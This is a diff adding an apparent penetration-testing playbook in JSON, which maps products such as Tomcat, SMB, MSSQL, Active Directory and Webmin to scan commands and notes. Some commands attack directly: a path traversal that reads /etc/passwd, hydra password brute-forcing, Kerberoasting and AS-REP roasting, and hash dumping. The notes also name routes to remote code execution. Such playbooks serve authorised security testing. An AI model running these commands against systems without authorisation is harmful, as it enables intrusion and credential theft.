+      "ffuf -u http://TARGET/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.html,.txt,.bak,.old",
+      "nuclei -u http://TARGET -tags apache"
+    ],
+    "notes": "Check for mod_status, mod_info exposure. Test for path traversal on 2.4.49-2.4.50."
+  },
+  "http_nginx": {
+    "ports": [80, 443, 8080, 8443],
+    "services": ["http", "https"],
+    "products": ["nginx"],
+    "description": "Nginx - product-specific checks",
+    "commands": [
+      "curl -s http://TARGET/nginx_status",
+      "curl -s http://TARGET/stub_status",
+      "curl -s -H 'Host: ' http://TARGET/",
+      "nmap --script http-server-header -p PORT TARGET",
+      "ffuf -u http://TARGET/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.html,.conf",
+      "nuclei -u http://TARGET -tags nginx",
+      "curl -s http://TARGET/%2e%2e/etc/passwd"
+    ],
+    "notes": "Check for stub_status exposure, alias traversal, off-by-slash misconfig."
+  },
+  "http_iis": {
+    "ports": [80, 443, 8080, 8443],
+    "services": ["http", "https"],
+    "products": ["iis", "microsoft iis"],
+    "description": "Microsoft IIS - product-specific checks",
+    "commands": [
+      "nmap --script http-iis-short-name-brute -p PORT TARGET",
+      "nmap --script http-iis-webdav-vuln -p PORT TARGET",
+      "nmap --script http-webdav-scan -p PORT TARGET",
+      "curl -s -X OPTIONS http://TARGET/ -I",
+      "gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt -x asp,aspx,ashx,asmx,config",
+      "nuclei -u http://TARGET -tags iis",
+      "curl -s http://TARGET/aspnet_client/",
+      "curl -s http://TARGET/web.config"
+    ],
+    "notes": "Check for short name brute force (8.3 filenames), WebDAV, and .config disclosure."
+  },
+  "http_tomcat": {
+    "ports": [8080, 8443, 80, 443, 8009],
+    "services": ["http", "https"],
+    "products": ["tomcat", "apache tomcat", "coyote"],
+    "description": "Apache Tomcat - product-specific checks",
+    "commands": [
+      "curl -s http://TARGET:8080/manager/html",
+      "curl -s http://TARGET:8080/host-manager/html",
+      "curl -s http://TARGET:8080/manager/status",
+      "nmap --script http-tomcat-manager-bruteforce -p PORT TARGET",
+      "gobuster dir -u http://TARGET:8080 -w /usr/share/wordlists/dirb/common.txt -x jsp,war,txt",
+      "hydra -L /usr/share/wordlists/metasploit/tomcat_mgr_default_users.txt -P /usr/share/wordlists/metasploit/tomcat_mgr_default_pass.txt http://TARGET:8080/manager/html",
+      "curl -s http://TARGET:8080/WEB-INF/web.xml",
+      "nuclei -u http://TARGET:8080 -tags tomcat"
+    ],
+    "notes": "Default creds on /manager are very common. Check for WAR file upload via manager."
+  },
+  "http_wordpress": {
+    "ports": [80, 443, 8080],
+    "services": ["http", "https"],
+    "products": ["wordpress"],
+    "description": "WordPress CMS - product-specific checks",
+    "commands": [
+      "wpscan --url http://TARGET --enumerate u,p,t,tt --no-banner",
+      "wpscan --url http://TARGET --enumerate vp --no-banner",
+      "curl -s http://TARGET/wp-json/wp/v2/users",
+      "curl -s http://TARGET/wp-login.php",
+      "curl -s http://TARGET/xmlrpc.php",
+      "curl -s http://TARGET/readme.html",
+      "nuclei -u http://TARGET -tags wordpress",
+      "ffuf -u http://TARGET/wp-content/plugins/FUZZ -w /usr/share/wordlists/dirb/common.txt"
+    ],
+    "notes": "WPScan is the go-to. Check xmlrpc.php for brute-force amplification. Enumerate plugins."
+  },
+  "http_joomla": {
+    "ports": [80, 443, 8080],
+    "services": ["http", "https"],
+    "products": ["joomla"],
+    "description": "Joomla CMS - product-specific checks",
+    "commands": [
+      "curl -s http://TARGET/administrator/",
+      "curl -s http://TARGET/configuration.php.bak",
+      "curl -s http://TARGET/README.txt",
+      "curl -s http://TARGET/api/index.php/v1/config/application?public=true",
+      "ffuf -u http://TARGET/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.txt,.bak",
+      "nuclei -u http://TARGET -tags joomla"
+    ],
+    "notes": "Check for exposed admin panel, config backup, and API info disclosure."
+  },
+  "http_drupal": {
+    "ports": [80, 443, 8080],
+    "services": ["http", "https"],
+    "products": ["drupal"],
+    "description": "Drupal CMS - product-specific checks",
+    "commands": [
+      "curl -s http://TARGET/CHANGELOG.txt",
+      "curl -s http://TARGET/core/CHANGELOG.txt",
+      "curl -s http://TARGET/user/login",
+      "curl -s http://TARGET/node/1",
+      "curl -s http://TARGET/admin/config",
+      "ffuf -u http://TARGET/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.txt,.module",
+      "nuclei -u http://TARGET -tags drupal"
+    ],
+    "notes": "CHANGELOG.txt reveals exact version. Drupalgeddon (SA-CORE-2018-002) is critical."
+  },
+  "http_weblogic": {
+    "ports": [7001, 7002, 80, 443],
+    "services": ["http", "https"],
+    "products": ["weblogic", "oracle weblogic"],
+    "description": "Oracle WebLogic - product-specific checks",
+    "commands": [
+      "curl -s http://TARGET:7001/console/",
+      "curl -s http://TARGET:7001/wls-wsat/CoordinatorPortType",
+      "curl -s http://TARGET:7001/ws_utc/config.do",
+      "nmap --script http-weblogic-T3-info -p 7001 TARGET",
+      "nuclei -u http://TARGET:7001 -tags weblogic"
+    ],
+    "notes": "T3 protocol deserialization and console exposure are common attack vectors."
+  },
+  "http_jboss": {
+    "ports": [8080, 9990, 80, 443],
+    "services": ["http", "https"],
+    "products": ["jboss", "wildfly"],
+    "description": "JBoss/WildFly - product-specific checks",
+    "commands": [
+      "curl -s http://TARGET:8080/jmx-console/",
+      "curl -s http://TARGET:8080/web-console/",
+      "curl -s http://TARGET:9990/console/",
+      "curl -s http://TARGET:8080/invoker/JMXInvokerServlet",
+      "nuclei -u http://TARGET:8080 -tags jboss"
+    ],
+    "notes": "JMX console with default creds is a classic finding. Check for deserialization via invoker."
+  },
+  "ssh_openssh": {
+    "ports": [22],
+    "services": ["ssh"],
+    "products": ["openssh"],
+    "description": "OpenSSH - product-specific checks",
+    "commands": [
+      "ssh-audit TARGET",
+      "nmap --script ssh2-enum-algos,ssh-auth-methods,ssh-hostkey -p 22 TARGET",
+      "nmap --script ssh-publickey-acceptance -p 22 TARGET",
+      "nmap -sV --script banner -p 22 TARGET"
+    ],
+    "notes": "ssh-audit gives detailed algorithm/vulnerability analysis. Check for user enumeration on older versions."
+  },
+  "ssh_libssh": {
+    "ports": [22],
+    "services": ["ssh"],
+    "products": ["libssh"],
+    "description": "libssh - product-specific checks (CVE-2018-10933 auth bypass)",
+    "commands": [
+      "ssh-audit TARGET",
+      "nmap --script ssh2-enum-algos,ssh-auth-methods -p 22 TARGET",
+      "nmap -sV --script banner -p 22 TARGET"
+    ],
+    "notes": "libssh 0.6-0.8.3 vulnerable to auth bypass (CVE-2018-10933)."
+  },
+  "smb_windows": {
+    "ports": [445, 139],
+    "services": ["microsoft-ds", "smb", "netbios-ssn"],
+    "products": ["windows", "microsoft"],
+    "description": "Windows SMB - product-specific checks",
+    "commands": [
+      "crackmapexec smb TARGET --shares",
+      "crackmapexec smb TARGET --users",
+      "crackmapexec smb TARGET --pass-pol",
+      "crackmapexec smb TARGET --rid-brute",
+      "crackmapexec smb TARGET --sessions",
+      "crackmapexec smb TARGET --loggedon-users",
+      "crackmapexec smb TARGET --disks",
+      "crackmapexec smb TARGET --local-groups",
+      "smbclient -L //TARGET -N",
+      "smbmap -H TARGET",
+      "enum4linux -a TARGET",
+      "nmap --script smb-enum-shares,smb-enum-users,smb-os-discovery,smb-security-mode -p 445 TARGET",
+      "nmap --script smb-vuln-ms17-010,smb-vuln-ms08-067 -p 445 TARGET",
+      "nmap --script smb-vuln* -Pn -p 139,445 TARGET",
+      "rpcclient -U '' -N TARGET -c 'enumdomusers'",
+      "impacket-lookupsid TARGET"
+    ],
+    "notes": "Always check for EternalBlue (MS17-010). Null session enumeration is high value."
+  },
+  "smb_samba": {
+    "ports": [445, 139],
+    "services": ["smb", "netbios-ssn"],
+    "products": ["samba"],
+    "description": "Samba (Linux SMB) - product-specific checks",
+    "commands": [
+      "smbclient -L //TARGET -N",
+      "smbmap -H TARGET",
+      "enum4linux -a TARGET",
+      "nmap --script smb-enum-shares,smb-os-discovery,smb-security-mode -p 445 TARGET",
+      "nmap --script smb-vuln-cve-2017-7494 -p 445 TARGET",
+      "rpcclient -U '' -N TARGET -c 'enumdomusers'",
+      "crackmapexec smb TARGET --shares"
+    ],
+    "notes": "Check for SambaCry (CVE-2017-7494) on versions 3.5.0-4.6.4. Null sessions common on misconfigured Samba."
+  },
+  "mssql_specific": {
+    "ports": [1433, 1434],
+    "services": ["ms-sql-s", "ms-sql"],
+    "products": ["microsoft sql", "sql server"],
+    "description": "Microsoft SQL Server - product-specific checks",
+    "commands": [
+      "nmap --script ms-sql-info,ms-sql-ntlm-info,ms-sql-empty-password -p 1433 TARGET",
+      "nmap --script ms-sql-xp-cmdshell,ms-sql-config -p 1433 TARGET --script-args mssql.username=sa,mssql.password=''",
+      "nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password= -sV -p 1433 TARGET",
+      "crackmapexec mssql TARGET",
+      "crackmapexec mssql TARGET -u sa -p ''",
+      "nxc mssql TARGET -u sa -p '' --rid-brute 10000",
+      "impacket-mssqlclient TARGET -windows-auth",
+      "sqsh -S TARGET -U sa -P '' -D master",
+      "hydra -l sa -P /usr/share/wordlists/rockyou.txt mssql://TARGET"
+    ],
+    "notes": "sa with blank password is classic. xp_cmdshell gives RCE if enabled."
+  },
+  "mysql_specific": {
+    "ports": [3306],
+    "services": ["mysql"],
+    "products": ["mysql", "mariadb"],
+    "description": "MySQL/MariaDB - product-specific checks",
+    "commands": [
+      "nmap --script mysql-info,mysql-enum,mysql-empty-password -p 3306 TARGET",
+      "nmap --script mysql-databases,mysql-variables -p 3306 TARGET --script-args mysqluser=root",
+      "nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 TARGET",
+      "hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://TARGET",
+      "mysql -h TARGET -u root --skip-password -e 'SELECT version();'"
+    ],
+    "notes": "Root with no password is common on dev instances. Check for UDF exploitation."
+  },
+  "postgres_specific": {
+    "ports": [5432],
+    "services": ["postgresql"],
+    "products": ["postgresql", "postgres"],
+    "description": "PostgreSQL - product-specific checks",
+    "commands": [
+      "nmap --script pgsql-brute -p 5432 TARGET",
+      "hydra -l postgres -P /usr/share/wordlists/rockyou.txt postgres://TARGET",
+      "nmap -sV -p 5432 TARGET"
+    ],
+    "notes": "Default user is postgres. Check pg_hba.conf for trust auth. COPY TO/FROM gives file read/write."
+  },
+  "ftp_vsftpd": {
+    "ports": [21],
+    "services": ["ftp"],
+    "products": ["vsftpd"],
+    "description": "vsftpd - product-specific checks",
+    "commands": [
+      "nmap --script ftp-anon,ftp-syst,ftp-vsftpd-backdoor -p 21 TARGET",
+      "hydra -l anonymous -P /usr/share/wordlists/rockyou.txt ftp://TARGET"
+    ],
+    "notes": "vsftpd 2.3.4 has a famous backdoor (CVE-2011-2523). Always test with nmap script."
+  },
+  "ftp_proftpd": {
+    "ports": [21],
+    "services": ["ftp"],
+    "products": ["proftpd"],
+    "description": "ProFTPD - product-specific checks",
+    "commands": [
+      "nmap --script ftp-anon,ftp-syst,ftp-proftpd-backdoor -p 21 TARGET",
+      "hydra -l anonymous -P /usr/share/wordlists/rockyou.txt ftp://TARGET"
+    ],
+    "notes": "ProFTPD 1.3.3c has a backdoor. mod_copy allows unauthenticated file copy on 1.3.5."
+  },
+  "rdp_windows": {
+    "ports": [3389],
+    "services": ["ms-wbt-server", "rdp"],
+    "products": ["microsoft", "windows"],
+    "description": "Windows RDP - product-specific checks",
+    "commands": [
+      "nmap --script rdp-enum-encryption,rdp-ntlm-info,rdp-vuln-ms12-020 -p 3389 -T4 TARGET",
+      "crackmapexec rdp TARGET",
+      "hydra -l administrator -P /usr/share/wordlists/rockyou.txt rdp://TARGET"
+    ],
+    "notes": "Check for BlueKeep (CVE-2019-0708) on older Windows. NLA bypass is valuable."
+  },
+  "ldap_ad": {
+    "ports": [389, 636, 3268, 3269],
+    "services": ["ldap", "ldaps"],
+    "products": ["microsoft", "active directory", "windows"],
+    "description": "Active Directory LDAP - product-specific checks",
+    "commands": [
+      "ldapsearch -x -H ldap://TARGET -b '' -s base namingContexts",
+      "ldapsearch -x -H ldap://TARGET -b '' -s base defaultNamingContext",
+      "ldapsearch -H ldap://TARGET -x -s base -b '' \"(objectClass=*)\" \"*\" +",
+      "nmap --script ldap-rootdse,ldap-search -p 389 TARGET",
+      "nmap -n -sV --script \"ldap* and not brute\" -p 389 TARGET",
+      "crackmapexec ldap TARGET",
+      "crackmapexec ldap TARGET --users",
+      "crackmapexec ldap TARGET --groups",
+      "impacket-GetNPUsers DOMAIN/ -dc-ip TARGET -no-pass -usersfile users.txt",
+      "impacket-GetUserSPNs DOMAIN/ -dc-ip TARGET -no-pass"
+    ],
+    "notes": "AS-REP roasting and Kerberoasting are high-value AD attacks. Enumerate naming contexts first."
+  },
+  "http_exchange": {
+    "ports": [80, 443],
+    "services": ["http", "https"],
+    "products": ["exchange", "microsoft exchange"],
+    "description": "Microsoft Exchange - product-specific checks",
+    "commands": [
+      "curl -s https://TARGET/owa/",
+      "curl -s https://TARGET/ecp/",
+      "curl -s https://TARGET/autodiscover/autodiscover.xml",
+      "curl -s https://TARGET/mapi/nspi/",
+      "nmap --script http-ntlm-info --script-args http-ntlm-info.root=/ews/ -p 443 TARGET",
+      "nuclei -u https://TARGET -tags exchange"
+    ],
+    "notes": "ProxyShell and ProxyLogon are critical Exchange vulns. OWA often leaks domain info via NTLM."
+  },
+  "http_phpmyadmin": {
+    "ports": [80, 443, 8080],
+    "services": ["http", "https"],
+    "products": ["phpmyadmin"],
+    "description": "phpMyAdmin - product-specific checks",
+    "commands": [
+      "curl -s http://TARGET/phpmyadmin/",
+      "curl -s http://TARGET/phpmyadmin/setup/",
+      "curl -s http://TARGET/phpmyadmin/README",
+      "nuclei -u http://TARGET -tags phpmyadmin",
+      "hydra -l root -P /usr/share/wordlists/rockyou.txt http://TARGET/phpmyadmin/"
+    ],
+    "notes": "Setup page without auth is a common misconfiguration. Check for default root/empty password."
+  },
+  "http_webmin_product": {
+    "ports": [10000],
+    "services": ["http", "https"],
+    "products": ["webmin", "miniserv"],
+    "description": "Webmin - product-specific checks",
+    "commands": [
+      "curl -sk https://TARGET:10000/",
+      "curl -sk https://TARGET:10000/password_change.cgi",
+      "nuclei -u https://TARGET:10000 -tags webmin",
+      "nmap --script http-vuln-cve2019-15107 -p 10000 TARGET"
+    ],
+    "notes": "CVE-2019-15107 allows unauthenticated RCE via password_change.cgi on Webmin 1.890-1.920."
+  }
+}
